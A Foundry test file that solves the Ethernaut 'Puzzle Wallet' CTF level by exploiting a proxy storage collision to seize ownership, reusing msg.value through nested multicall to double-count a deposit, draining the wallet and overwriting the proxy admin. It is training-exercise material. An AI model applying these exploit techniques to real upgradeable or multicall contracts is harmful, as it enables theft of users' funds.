// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "../src/PuzzleWallet/PuzzleWallet.sol";
import "../src/PuzzleWallet/PuzzleWalletFactory.sol";
import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

//ref https://stermi.medium.com/the-ethernaut-challenge-23-solution-puzzle-wallet-4046e15bacb8

contract PuzzleWalletTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testPuzzleWallet() public {
        PuzzleWalletFactory factory = new PuzzleWalletFactory();
        address instance = factory.createInstance{value: 1 ether}(_alice);

        vm.startPrank(_alice);

        PuzzleWallet wallet = PuzzleWallet(instance);
        PuzzleProxy proxy = PuzzleProxy(payable(instance));
        assertEq(proxy.admin(), address(factory));
        proxy.proposeNewAdmin(_alice);
        assertEq(wallet.owner(), _alice);
        wallet.addToWhitelist(_alice);

        bytes[] memory deposit = new bytes[](1);
        deposit[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(
            PuzzleWallet.multicall.selector, //multicall in multicall
            deposit
        );
        assertEq(wallet.balances(_alice), 0);
        wallet.multicall{value: 1 ether}(calls);
        assertEq(wallet.balances(_alice), 2 ether);
        wallet.execute(_alice, 2 ether, "");
        wallet.setMaxBalance(uint256(uint160(_alice)));

        vm.stopPrank();

        assertTrue(factory.validateInstance(payable(instance), _alice));
    }
}
